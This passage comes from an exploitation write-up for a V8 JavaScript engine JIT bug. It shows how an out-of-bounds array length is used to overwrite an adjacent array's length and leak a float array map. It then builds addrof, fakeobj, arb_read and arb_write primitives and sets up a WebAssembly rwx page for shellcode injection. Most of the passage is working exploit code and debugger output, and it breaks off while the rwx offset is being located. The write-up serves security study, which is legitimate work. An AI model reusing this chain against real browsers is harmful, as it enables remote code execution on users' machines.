    - instance descriptors #1: 0x2bdb0820bc0d &lt;DescriptorArray[1]>
    - transitions #1: 0x2bdb0820bc89 &lt;TransitionArray[4]>Transition array #1:
        0x2bdb08044f4d &lt;Symbol: (elements_transition_symbol)>: (transition to HOLEY_ELEMENTS) -> 0x2bdb082439ed &lt;Map(HOLEY_ELEMENTS)>
   
    - prototype: 0x2bdb0820b759 &lt;JSArray[0]>
    - constructor: 0x2bdb0820b4f5 &lt;JSFunction Array (sfi = 0x2bdb0818b435)>
    - dependent code: 0x2bdb080421b5 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)>
    - construction counter: 0
  </code>
  </pre>
<p>Looking at it in memory:</p>
<pre style="background-color: #100E15; border: none !important;">
<code>
  gef➤  job 0x2bdb0808943d
  0x2bdb0808943d: [JSArray]
   - map: 0x2bdb082439c5 &lt;Map(PACKED_ELEMENTS)> [FastProperties]
   - prototype: 0x2bdb0820b759 &lt;JSArray[0]>
   - elements: 0x2bdb0808942d &lt;FixedArray[2]> [PACKED_ELEMENTS]
   - length: 2
   - properties: 0x2bdb08042229 &lt;FixedArray[0]>
   - All own properties (excluding elements): {
      0x2bdb08044649: [String] in ReadOnlySpace: #length: 0x2bdb08182159 <AccessorInfo> (const accessor descriptor), location: descriptor
   }
   - elements: 0x2bdb0808942d &lt;FixedArray[2]> {
             0: 0x2bdb080893ed &lt;JSArray[4294967295]>   &lt;-- arr
             1: 0x2bdb0808941d &lt;JSArray[3]>            &lt;-- cor
   }
  
  gef➤  x/10gx 0x2bdb080893ed-1       &lt;-- arr
  0x2bdb080893ec:	0x080422290824394d	0xfffffffe080893e1  &lt;--length in memory (arr)
  0x2bdb080893fc:	0x0000000608042a89	0x3ff199999999999a
  0x2bdb0808940c:	0x3ff3333333333333	0x3ff4cccccccccccd
  0x2bdb0808941c:	0x0804222908243975	0x00000006080893fd
  0x2bdb0808942c:	0x0000000408042201	0x0808941d080893ed
  gef➤  x/10gx 0x2bdb0808941d-1       &lt;-- cor
  0x2bdb0808941c:	0x0804222908243975	0x00000006080893fd  &lt;--length in memory (cor)
  0x2bdb0808942c:	0x0000000408042201	0x0808941d080893ed
  0x2bdb0808943c:	0x08042229082439c5	0x000000040808942d
  0x2bdb0808944c:	0x0804222908042229	0x0804553100000000
  0x2bdb0808945c:	0x08042a8908212abd	0x9999999a00000006    
</code>
</pre>
<p>The  <code>arr.length</code>, being <code>-1</code> here will cause the array field to generate a length of <code>0xffffffff</code> when <code>arr.shift();</code> occurs, which will modify the length field of <code>arr</code> in memory to <code>0xfffffffe</code>, resulting in out-of-bounds condition (as previously mentioned earlier). Since <code>arr</code> and <code>cor</code> are continuously allocated,  through <code>arr</code> the data structure of <code>cor</code> can be accessed out-of-bounds, forming the basis for later use in exploitation.</p>
<p>Next we need to overwrite the length of <code>cor</code>.</p>
<p><h3><font color="white">[ OVERWRITING THE LENGTH OF ARRAY <code>cor</code> ]</font></h3></p>
<p>What exists past the end of an array?  It looks to be the Map of <code>JSArray</code> as that is what comes after the last index of the <code>FixedDoubleArray</code>. </p>
<p>After <code>%DebugPrint([idx])</code> iterated from <code>0</code> onwards, many segmentation faults were received up until <code>arr[13]</code>. This was the Map of <code>JSArray</code>. Where, <code>arr[14]</code> was the <code>FixedArray</code> and <code>arr[15]</code> being the <code>FixedDoubleArray</code> of <code>cor</code>, and finally <code>arr[16]</code>, being the length of the <code>cor</code> array, of which was <code>0x3</code> (<code>3</code>), as this array was defined as <code>var cor = [1.1, 1.2, 1.3];</code>.</p>
<p>Therefore, to overwrite the length of <code>cor</code>, we need to <code>overwrite</code> the value of <code>arr[16]</code>.</p>
<p><b>NOTE</b> Array objects have an additional length field as well (lengths are represented as an smi).</p>
<p>The above is demonstrated below, where <code>debug_foo.js</code> contains:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
  function foo(a) {
    //..
  }
  //...
  const ret = foo(false); 
  var arr = ret[0]; 
  var cor = ret[1]; 
  %DebugPrint(cor);  //before overwrite of cor
  %DebugPrint(arr[13]); //map of JSArray (arr)
  %DebugPrint(arr[14]); //FixedArray
  %DebugPrint(arr[15]); //FixedDoubleArray of cor
  %DebugPrint(arr[16]); // length of cor before overwrite
  arr[16] = 0x4242; //overwrites the cor array length to 0x4242 (16962)
  %DebugPrint(arr[16]); //length of cor after overwrite
  %DebugPrint(cor); //after overwrite      
</code>
</pre>
<code>./d8 debug_foo.js --allow-natives-syntax</code> output:
<pre style="background-color: #100E15; border: none !important;">
<code>
  DebugPrint: 0x51408243975: [Map]     &lt;--arr[13]
  - type: JS_ARRAY_TYPE
  - instance size: 16
  - inobject properties: 0
  - elements kind: PACKED_DOUBLE_ELEMENTS
  - unused property fields: 0
  - enum length: invalid
  - back pointer: 0x05140824394d &lt;Map(HOLEY_SMI_ELEMENTS)>
  - prototype_validity cell: 0x051408182445 &lt;Cell value= 1>
  - instance descriptors #1: 0x05140820bc0d &lt;DescriptorArray[1]>
  - transitions #1: 0x05140820bc59 &lt;TransitionArray[4]>Transition array #1:
      0x051408044f4d &lt;Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x05140824399d <Map(HOLEY_DOUBLE_ELEMENTS)>
 
  - prototype: 0x05140820b759 &lt;JSArray[0]>
  - constructor: 0x05140820b4f5 &lt;JSFunction Array (sfi = 0x5140818b435)>
  - dependent code: 0x0514080421b5 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)>
  - construction counter: 0
 0x51408042115: [Map] in ReadOnlySpace
  - type: MAP_TYPE
  - instance size: 40
  - elements kind: HOLEY_ELEMENTS
  - unused property fields: 0
  - enum length: invalid
  - stable_map
  - non-extensible
  - back pointer: 0x0514080423b1 &lt;undefined>
  - prototype_validity cell: 0
  - instance descriptors (own) #0: 0x0514080421bd &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
  - prototype: 0x051408042231 &lt;null>
  - constructor: 0x051408042231 &lt;null>
  - dependent code: 0x0514080421b5 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)>
  - construction counter: 0
 
 DebugPrint: 0x51408042229: [FixedArray] in ReadOnlySpace    &lt;--arr[14]
  - map: 0x051408042201 &lt;Map>
  - length: 0
 0x51408042201: [Map] in ReadOnlySpace
  - type: FIXED_ARRAY_TYPE
  - instance size: variable
  - elements kind: HOLEY_ELEMENTS
  - unused property fields: 0
  - enum length: invalid
  - stable_map
  - non-extensible
  - back pointer: 0x0514080423b1 &lt;undefined>
  - prototype_validity cell: 0
  - instance descriptors (own) #0: 0x0514080421bd &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
  - prototype: 0x051408042231 &lt;null>
  - constructor: 0x051408042231 &lt;null>
  - dependent code: 0x0514080421b5 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)>
  - construction counter: 0
 
 DebugPrint: 0x514081663c1: [FixedDoubleArray]    &lt;-- arr[15]
  - map: 0x051408042a89 &lt;Map>
  - length: 3
          0-2: 1.1
 0x51408042a89: [Map] in ReadOnlySpace
  - type: FIXED_DOUBLE_ARRAY_TYPE
  - instance size: variable
  - elements kind: HOLEY_DOUBLE_ELEMENTS
  - unused property fields: 0
  - enum length: invalid
  - stable_map
  - back pointer: 0x0514080423b1 &lt;undefined>
  - prototype_validity cell: 0
  - instance descriptors (own) #0: 0x0514080421bd &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
  - prototype: 0x051408042231 &lt;null>
  - constructor: 0x051408042231 &lt;null>
  - dependent code: 0x0514080421b5 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)>
  - construction counter: 0
 
 DebugPrint: Smi: 0x3 (3) &lt;-- arr[16] before arr[16] = 0x4242;
 
 DebugPrint: Smi: 0x4242 (16962) &lt;-- arr[16] after arr[16] = 0x4242;
 
 Trace/breakpoint trap (core dumped)
</code>
</pre>
Again, to re-iterate, before overwriting <code>cor</code>:
<pre style="background-color: #100E15; border: none !important;">
  <code>
    DebugPrint: 0x3fb7082aa03d: [JSArray]           <--cor before overwrite
    - map: 0x3fb708243975 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
    - prototype: 0x3fb70820b759 <JSArray[0]>
    - elements: 0x3fb7082aa01d <FixedDoubleArray[3]> [PACKED_DOUBLE_ELEMENTS]
    - length: 3                 <-- cor length before overwrite
    - properties: 0x3fb708042229 <FixedArray[0]>
    - All own properties (excluding elements): {
       0x3fb708044649: [String] in ReadOnlySpace: #length: 0x3fb708182159 <AccessorInfo> (const accessor descriptor), location: descriptor
    }
    - elements: 0x3fb7082aa01d <FixedDoubleArray[3]> {
            0-2: 1.1
    }
   0x3fb708243975: [Map]                 &lt;-- arr[13] is the map of cor
    - type: JS_ARRAY_TYPE
    - instance size: 16
    - inobject properties: 0
    - elements kind: PACKED_DOUBLE_ELEMENTS
    - unused property fields: 0
    - enum length: invalid
    - back pointer: 0x3fb70824394d &lt;Map(HOLEY_SMI_ELEMENTS)>
    - prototype_validity cell: 0x3fb708182445 &lt;Cell value= 1>
    - instance descriptors #1: 0x3fb70820bc0d &lt;DescriptorArray[1]>
    - transitions #1: 0x3fb70820bc59 &lt;TransitionArray[4]>Transition array #1:
        0x3fb708044f4d &lt;Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x3fb70824399d &lt;Map(HOLEY_DOUBLE_ELEMENTS)>
   
    - prototype: 0x3fb70820b759 &lt;JSArray[0]>
    - constructor: 0x3fb70820b4f5 &lt;JSFunction Array (sfi = 0x3fb70818b435)>
    - dependent code: 0x3fb7080421b5 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)>
    - construction counter: 0
   
   DebugPrint: Smi: 0x3 (3)    &lt;-- arr[16] is the length of cor. We overwrite this.     
  </code>
  </pre>
  <p>Again, to re-iterate, after overwriting <code>cor</code>:</p>
  <pre style="background-color: #100E15; border: none !important;">
  <code>
    DebugPrint: Smi: 0x3 (3)  &lt;-- arr[16], length of cor. Before overwrite

    DebugPrint: Smi: 0x4242 (16962) &lt;-- arr[16], length of cor. After overwrite
    
    DebugPrint: 0x3fb7082aa03d: [JSArray]
     - map: 0x3fb708243975 &lt;Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
     - prototype: 0x3fb70820b759 &lt;JSArray[0]>
     - elements: 0x3fb7082aa01d &lt;FixedDoubleArray[3]> [PACKED_DOUBLE_ELEMENTS]
     - length: 16962            &lt;-- cor length after overwrite (via arr[16])
     - properties: 0x3fb708042229 &lt;FixedArray[0]>
     - All own properties (excluding elements): {
        0x3fb708044649: [String] in ReadOnlySpace: #length: 0x3fb708182159 &lt;AccessorInfo> (const accessor descriptor), location: descriptor
     }
     - elements: 0x3fb7082aa01d &lt;FixedDoubleArray[3]> {
             0-2: 1.1
     }
    0x3fb708243975: [Map]
     - type: JS_ARRAY_TYPE
     - instance size: 16
     - inobject properties: 0
     - elements kind: PACKED_DOUBLE_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - back pointer: 0x3fb70824394d &lt;Map(HOLEY_SMI_ELEMENTS)>
     - prototype_validity cell: 0x3fb708182445 &lt;Cell value= 1>
     - instance descriptors #1: 0x3fb70820bc0d &lt;DescriptorArray[1]>
     - transitions #1: 0x3fb70820bc59 &lt;TransitionArray[4]>Transition array #1:
         0x3fb708044f4d &lt;Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x3fb70824399d &lt;Map(HOLEY_DOUBLE_ELEMENTS)>
    
     - prototype: 0x3fb70820b759 &lt;JSArray[0]>
     - constructor: 0x3fb70820b4f5 &lt;JSFunction Array (sfi = 0x3fb70818b435)>
     - dependent code: 0x3fb7080421b5 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)>
     - construction counter: 0      
  </code>
  </pre>
  <p>So now we have overwritten the length of <code>cor</code> through <code>arr[16]</code>. Next we need to create our <code>addrof</code> and <code>fakeobj</code> primitives. However, before doing so, we can leak a float array map from <code>cor</code> for later use. Similar to how we indexed through <code>arr</code> via <code>arr[idx]</code>, to locate the length of <code>cor</code> for it to be overwritten, we can do the same here:</p>
  
  <pre style="background-color: #100E15; border: none !important;">
  <code class="language-js">
    function foo(a) {
      //...
      }
      //...
      %DebugPrint(cor[0]);
      %DebugPrint(cor[1]);
      %DebugPrint(cor[2]);
      %DebugPrint(cor[3]);
      //...
  </code>
  </pre>
<p>The debug output of this is as follows:</p>
<pre style="background-color: #100E15; border: none !important;">
<code>
  DebugPrint: 1.1      <-- cor[0]
  0x2efe080423cd: [Map] in ReadOnlySpace
   - type: HEAP_NUMBER_TYPE
   - instance size: 12
   - elements kind: HOLEY_ELEMENTS
   - unused property fields: 0
   - enum length: invalid
   - stable_map
   - back pointer: 0x2efe080423b1 <undefined>
   - prototype_validity cell: 0
   - instance descriptors (own) #0: 0x2efe080421bd <Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
   - prototype: 0x2efe08042231 <null>
   - constructor: 0x2efe08042231 <null>
   - dependent code: 0x2efe080421b5 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
   - construction counter: 0
  
  DebugPrint: 1.1     <-- cor[1]
  0x2efe080423cd: [Map] in ReadOnlySpace
   - type: HEAP_NUMBER_TYPE
   - instance size: 12
   - elements kind: HOLEY_ELEMENTS
   - unused property fields: 0
   - enum length: invalid
   - stable_map
   - back pointer: 0x2efe080423b1 <undefined>
   - prototype_validity cell: 0
   - instance descriptors (own) #0: 0x2efe080421bd <Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
   - prototype: 0x2efe08042231 <null>
   - constructor: 0x2efe08042231 <null>
   - dependent code: 0x2efe080421b5 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
   - construction counter: 0
  
  DebugPrint: 1.1    &lt;-- cor[2]
  0x2efe080423cd: [Map] in ReadOnlySpace
   - type: HEAP_NUMBER_TYPE
   - instance size: 12
   - elements kind: HOLEY_ELEMENTS
   - unused property fields: 0
   - enum length: invalid
   - stable_map
   - back pointer: 0x2efe080423b1 &lt;undefined>
   - prototype_validity cell: 0
   - instance descriptors (own) #0: 0x2efe080421bd &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
   - prototype: 0x2efe08042231 &lt;null>
   - constructor: 0x2efe08042231 &lt;null>
   - dependent code: 0x2efe080421b5 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)>
   - construction counter: 0
  
  DebugPrint: 4.76378e-270 &lt;--cor[3]             &lt;-- our float_array_map
  0x2efe080423cd: [Map] in ReadOnlySpace
   - type: HEAP_NUMBER_TYPE
   - instance size: 12
   - elements kind: HOLEY_ELEMENTS
   - unused property fields: 0
   - enum length: invalid
   - stable_map
   - back pointer: 0x2efe080423b1 &lt;undefined>
   - prototype_validity cell: 0
   - instance descriptors (own) #0: 0x2efe080421bd &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
   - prototype: 0x2efe08042231 &lt;null>
   - constructor: 0x2efe08042231 &lt;null>
   - dependent code: 0x2efe080421b5 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)>
   - construction counter: 0    
</code>
</pre>
<p>We can therefore use the pointer at <code>cor[3]</code> as our leaked float array map, which will be used later.</p>
<p>Before proceeding, through debug printing while iterating through <code>arr[idx]</code> values, it was observed that <code>arr[idx]</code> could access <code>cor[idx]</code> values, as is obviously expected with an out-of-bounds read. As a result of identifying <code>arr[16]</code> being pertinent to <code>cor.length</code>, there is speculation to the use of <code>arr[7]</code>, <code>arr[9]</code>, as well as <code>arr[11]</code> in terms of accessing stored <code>cor[idx]</code> values, let's have a look at this in memory:</p>
<pre style="background-color: #100E15; border: none !important;">
<code>
  gef➤  job 0x2577080b82ed
  0x2577080b82ed: [JSArray]
   - map: 0x2577082439c5 &lt;Map(PACKED_ELEMENTS)> [FastProperties]
   - prototype: 0x25770820b759 &lt;JSArray[0]>
   - elements: 0x2577080b82dd &lt;FixedArray[2]> [PACKED_ELEMENTS]
   - length: 2
   - properties: 0x257708042229 &lt;FixedArray[0]>
   - All own properties (excluding elements): {
      0x257708044649: [String] in ReadOnlySpace: #length: 0x257708182159 &lt;AccessorInfo> (const accessor descriptor), location: descriptor
   }
   - elements: 0x2577080b82dd &lt;FixedArray[2]> {
             0: 0x2577080b829d &lt;JSArray[4294967295]>
             1: 0x2577080b82cd &lt;JSArray[16962]>
   }
  
  gef➤  x/4gx 0x2577080b829d-1        &lt;-- arr
  0x2577080b829c:	0x080422290824394d	0xfffffffe080b8291
  0x2577080b82ac:	0x0000000608042a89	0x3ff199999999999a
  
  gef➤  x/4gx 0x2577080b8291-1       &lt;-- arr elements
  0x2577080b8290:	0x0804242908042201	0x0824394d08042429
  0x2577080b82a0:	0x080b829108042229	0x08042a89fffffffe
  
  gef➤  x/4gx 0x2577080b82cd-1       &lt;-- cor
  0x2577080b82cc:	0x0804222908243975	0x00008484080b82ad
  0x2577080b82dc:	0x0000000408042201	0x080b82cd080b829d
  
  gef➤  x/4gx 0x2577080b82ad-1      &lt;-- cor elements
  0x2577080b82ac:	0x0000000608042a89	0x3ff199999999999a
  0x2577080b82bc:	0x3ff3333333333333	0x3ff4cccccccccccd
  
  gef➤  x/4gx 0x2577080b8291-1 + 8 + (4*16) &lt;--arr[16] can access cor.length 
  0x2577080b82d8:	0x0804220100008484	0x080b829d00000004
  0x2577080b82e8:	0x082439c5080b82cd	0x080b82dd08042229
  
  gef➤  x/4gx 0x2577080b8291-1 + 8 + (4*7) &lt;--arr[7] can access cor[0] 
  0x2577080b82b4:	0x3ff199999999999a	0x3ff3333333333333
  0x2577080b82c4:	0x3ff4cccccccccccd	0x0804222908243975
  
  gef➤  x/4gx 0x2577080b8291-1 + 8 + (4*9) &lt;--arr[9] can access cor[1] 
  0x2577080b82bc:	0x3ff3333333333333	0x3ff4cccccccccccd
  0x2577080b82cc:	0x0804222908243975	0x00008484080b82ad
  
  gef➤  x/4gx 0x2577080b8291-1 + 8 + (4*11) &lt;--arr[11] can access cor[2] 
  0x2577080b82c4:	0x3ff4cccccccccccd	0x0804222908243975
  0x2577080b82d4:	0x00008484080b82ad	0x0000000408042201
  
  gef➤  p/f 0x3ff199999999999a  &lt;--cor[0] in memory
  $1 = 1.1000000000000001       &lt;-- value of cor[0]
  
  gef➤  p/f 0x3ff3333333333333  &lt;--cor[1] in memory
  $2 = 1.2                      &lt;-- value of cor[1] 
  
  gef➤  p/f 0x3ff4cccccccccccd  &lt;--cor[2] in memory
  $3 = 1.3                      &lt;--value of cor[2]      
</code>
</pre>
<p>The above proves that <code>arr[16]</code> can indeed access <code>cor.length</code>. Also of observation in the above, is that; <code>arr[7]</code> can access <code>cor[0]</code>, similarly <code>arr[9]</code> can access <code>cor[1]</code> , and <code>arr[11]</code> can access <code>cor[2]</code>.</p>
<p>Just a <b>note</b> on the above gdb dump (probably not too relevant, but beneficial to recall): In regards to pointer <code>0xfffffffe080b8291</code> which we have previously established; the <code>0xfffffffe</code> length is from the <code>-1</code> resulting from <code>arr.shift();</code>(see way further above). This value (smi) being the length of <code>arr</code> is moved to the left and stored in memory, so the length  in this array is saved as <code>0xfffffffe</code>. We simply viewed the elements of <code>arr</code>, by replacing this length value and applying that of the original pointer length in order to properly access the elements of <code>arr</code> in memory,  hence the pointer <code>0x2577080b8291</code> being used to access said elements in the above. This is hard to explain with words, so I've included a figure below:</p>
<center><img src="../images/gdb.png" width="500"></center><br>

<p>With that out the way, we now have the following for:</p>
<br>1. Constructing our <code>addrof</code> primitive,
<br>2. Constructing our <code>fakeobj</code> primitive.
<p>Before continuing, we will include the following common helper functions for ease of converting between float and integer primitives (vice versa) in our exploit:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
  var buf = new ArrayBuffer(8); // 8 byte array buffer
  var f64_buf = new Float64Array(buf);
  var u64_buf = new Uint32Array(buf);
  
  function ftoi(val) { // typeof(val) = float
      f64_buf[0] = val;
      
      // Watch for little endianness
      return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
  }
  
  function itof(val) { // typeof(val) = BigInt
      u64_buf[0] = Number(val & 0xffffffffn);
      u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
  }
  
  function foo(a) {
    //...
  }
  //...
</code>
</pre>
<p><h3><font color="white">[ CONSTRUCTING <code>AddrOf</code> and <code>FakeObj</code> PRIMITIVES ]</font></h3></p>
<p>Vulnerabilities in JIT offer many advantages, one of which, offering the ability to construct runtime primitives that can offer reliable exploitability without the need to bypass ASLR etc.</p>
<p>Knowing the above, and having already overwritten the value of <code>cor.length</code> via <code>arr[16]</code>. We can either use <code>arr[7]</code>/<code>cor[0]</code>, <code>arr[9]</code>/<code>cor[1]</code>, or <code>arr[11]</code>/<code>cor[2]</code> for crafting our <code>addrof</code> and <code>fakeobj</code> primitives. Let's use <code>arr[11]</code>/<code>cor[2]</code> here:</p>
<p>Constructing our <code>addrof</code> primitive:</p>
<pre style="background-color: #100E15; border: none !important;">
  <code class="language-js">
    function addrof(obj) {
      arr[11] = obj;
      return ftoi(cor[2]);
    }   
  </code>
  </pre>
 <p>The <code>addrof</code> primitive takes an object at <code>arr[11]</code>, and returns its address in memory.</p> 
 <p>Constructing our <code>fakeobj</code> primitive:</p>
  <pre style="background-color: #100E15; border: none !important;">
  <code class="language-js">
    function fakeobj(addr) {
      cor[2] = itof(addr);
      return arr[11];
    }      
  </code>
  </pre>
  <p>The <code>fakeobj</code> primitive is essentially the inverse of the <code>addrof</code> primitive, as <code>addrof</code> returns the address of an object, the <code>fakeobj</code> primitive lets us create an object anywhere in memory, of which, we can read from and write to.</p>
  <p>We can add this to our exploit, alongside our leaked <code>float_array_map</code>, being <code>cor[3]</code> (identified earlier above):</p>
    <pre style="background-color: #100E15; border: none !important;">
  <code class="language-js">
    //...
    function ftoi(val) { 
        //...
    }
    
    function itof(val) { 
        //...
    }
    
    function foo(a) {
      //...
    }
    //...
    
    let float_array_map = ftoi(cor[3]);
    
    function addrof(obj) {
      arr[11] = obj;
      return ftoi(cor[2]);
    }
    
    function fakeobj(addr) {
      cor[2] = itof(addr);
      return arr[11];
    }
    //...
  </code>
  </pre>
<p>Next we need to create our <code>arb_read</code> and <code>arb_write</code> primitives. But first, we need to do some more work before hand.</p>
<p>We can create another array called <code>rw_arr</code> to have it's <code>0</code> index at our leaked array map (<code>float_array_map</code>), as well as forge an object called <code>fake</code> so that the elements pointer of <code>fake</code> can be accessed through <code>rw_arr</code>. This will permit the read/write pointer to be able to read and write an arbitrary address.</p>
<p>For this next step we will need to determine the offset for our <code>fake</code> object. We can determine this with pairing <code>%DebugPrint()</code> with <code>gdb</code>. On a side note I also found the following of interest:</p>
<p><b>JSArrayBuffer Offsets</b></p>
<p><center><img src="../images/jsarraybuffer.png"></center></p>
<p><b>OOB Attack Path</b></p>
<p><center><img src="../images/oobattackpath.png"></center></p>
<p>We can  define our <code>rw_arr</code> array and forged <code>fake</code> object:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
  rw_arr = [itof(float_array_map), 1.1, 1.2, 1.3]
  fake = fakeobj(addrof(rw_arr) + 0x20n); // victim object offset    
</code>
</pre>

<p><h3><font color="white">[ CONSTRUCTING <code>ArbRead</code> and <code>ArbWrite</code> PRIMITIVES ]</font></h3></p>
<p>With the two constructed primitives, <code>addrof</code> and <code>fakeobj</code>, we can now construct our arbitrary read and primitives, <code>arb_read</code> and <code>arb_write</code>.</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
function arb_read(addr) {
    fake = fakeobj(addrof(rw_arr) + 0x20n); //victim object offset
    rw_arr[1] = itof((0x12n &lt;&lt; 32n) + (addr += 1n) - 0x8n); //offset
    return ftoi(fake[0]);
}

function arb_write(addr, val) {
fake = fakeobj(addrof(rw_arr) + 0x20n); //victim object offset
  rw_arr[1] = itof((0x12n &lt;&lt; 32n) + (addr += 1n) - 0x8n); //offset
  fake[0] = itof(val);
  return;
}  
</code>
</pre>
<p>The above code; the <code>arb_read</code> function overwrites the elements pointer of <code>fake</code> with the address we want to read, then uses <code>fake</code> to read a value at the address. The <code>arb_write</code> function is essentially doing the same as <code>arb_read</code>, but storing a value in <code>fake</code>, essentially providing a write.</p>

<p><h3><font color="white">[ FROM OOB R/W TO REMOTE CODE EXECUTION (RCE) USING WEB ASSEMBLY (WASM) ]</font></h3></p>
<p>With the primitives needed now having been constructed, for every WebAssembly (WASM) instance, v8 will allocate a <code>rwx</code> memory region. With an arbitrary write, we can inject shellcode to this region and execute it in memory using the WebAssembly instance for payload delivery. </p>
<p><b>NOTE</b> reliability of this exploitation technique could vary, depending on whether or not it is possible to disable WebAssembly. As of recent versions of <code>V8</code>, hardening capabilities exist here. For example, it is my understanding that the WASM code region in more recent versions is now marked as W^X (with pkey_mprotect?), so the classic WASM trick that is to be used here wouldn't work anymore, alongside various other hardening efforts.</p>
<p>I performed two iterations of exploitation on this bug, one via WASM, another where I had <code>libc</code> as the target. I have included the WASM approach in my write-up though as there are limitations when it comes to targeting libc here, specifically in pertinence to target portability, alongside the different allocators used between V8 and Chromium i.e. <code>glibc/libc</code> and Chrome's <code>PartitionAlloc</code> allocator. Hence the WASM approach.</p>
<p>This <a href="https://caniuse.com/?search=wasm">reference</a> is handy to see which browsers, including Chrome, and their version numbers support WASM.</p>
<p>Creating a WASM instance for V8 to create an <code>rwx</code> segment:</p>  
<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
  var wasmCode = new Uint8Array([
  0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,
  0x60,0x00,0x01,0x7f,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,
  0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,
  0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,
  0x06,0x6d,0x65,0x6d,0x6f,0x72,0x79,0x02,0x00,0x04,0x6d,0x61,0x69,0x6e,0x00,
  0x00,0x0a,0x8a,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,
  0x2a,0x0b
]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var wasm_entry = wasmInstance.exports.main;
</code>
</pre>
<p>After running our updated exploit, we can locate the <code>rwx</code> segment in memory:</p>
<pre style="background-color: #100E15; border: none !important;">
  <code>
    gef➤  vmmap
    [ Legend:  Code | Heap | Stack ]
    Start              End                Offset             Perm Path
    0x00257e0805f000 0x00257e08080000 0x00000000000000 --- 
    0x00257e08080000 0x00257e0818d000 0x00000000000000 rw- 
    0x00257e0818d000 0x00257e081c0000 0x00000000000000 --- 
    0x00257e081c0000 0x00257e081c3000 0x00000000000000 rw- 
    0x00257e081c3000 0x00257e08200000 0x00000000000000 --- 
    0x00257e08200000 0x00257e083c0000 0x00000000000000 rw- 
    0x00257e083c0000 0x00257f00000000 0x00000000000000 --- 
    0x00315c1504c000 0x00315c1504d000 0x00000000000000 rwx       &lt;---- rwx 
    0x00556e92193000 0x00556e92982000 0x00000000000000 r-- /d8
    0x00556e92982000 0x00556e9370b000 0x000000007ee000 r-x /d8
    0x00556e9370b000 0x00556e93776000 0x00000001576000 r-- /d8
    0x00556e93776000 0x00556e93784000 0x000000015e0000 rw- /d8
    0x00556e93784000 0x00556e937b0000 0x00000000000000 rw- 
    0x00556e951da000 0x00556e952d0000 0x00000000000000 rw- [heap]
    0x007f3cfc000000 0x007f3d7c000000 0x00000000000000 --- 
    [...]    
  </code>
  </pre>
  <p>In this case, the <code>rwx</code> segment is at <code>0x00315c1504c000</code>, we can also see this object in memory after <code>%DebugPrint(wasmInstance)</code>:</p>
  <pre style="background-color: #100E15; border: none !important;">
  <code>
    DebugPrint: 0x257e08213fed: [WasmInstanceObject] in OldSpace
    [...]
   
   gef➤  x/16gx 0x257e08213fed-1                                        &lt;---wasmInstance ptr
   0x257e08213fec:	0x0804222908246e1d	0x7c00000008042229
   0x257e08213ffc:	0x0001000000007f3d	0x0000ffff00000000
   0x257e0821400c:	0x0000005000000000	0x080422290000257e
   0x257e0821401c:	0x0000556e95201b10	0x0000000008042229
   0x257e0821402c:	0x0000000000000000	0x0000000000000000
   0x257e0821403c:	0x0000000000000000	0x0000556e95201b30
   0x257e0821404c:	0x0000257e00000000	0x0000315c1504c000      &lt;---address of rwx
   0x257e0821405c:	0x082f56d5082f5559	0x08213fd5082030e1      
  </code>
  </pre>
  <p>Determining the offset of the <code>rwx</code> segment here is trivial and can be done in <code>gdb</code>. Basically it is just a matter of getting the <code>rwx</code> page address via <code>vmmap</code> (as illustrated above), search the little endian address, and subtract the address of <code>rwx</code> from the address of our pointer. An example of this is shown below. <b>NOTE</b> as expected, pointers/memory addresses will alter from the above output as this was ran as a seperate instance from the above:</p>
 
  <pre style="background-color: #100E15; border: none !important;">
  <code>
    %DebugPrint(wasmInstance);

    DebugPrint: 0x139908212be1: [WasmInstanceObject] in OldSpace
     - map: 0x139908246e1d &lt;Map(HOLEY_ELEMENTS)> [FastProperties]
     - prototype: 0x1399080873a1 &lt;Object map = 0x139908247395>
     - elements: 0x139908042229 &lt;FixedArray[0]> [HOLEY_ELEMENTS]
     - module_object: 0x139908088c2d &lt;Module map = 0x139908246cb5>
     - exports_object: 0x139908088d8d &lt;Object map = 0x139908247435>
     - native_context: 0x1399082030e1 &lt;NativeContext[244]>
     - memory_object: 0x139908212bc9 &lt;Memory map = 0x1399082470c5>
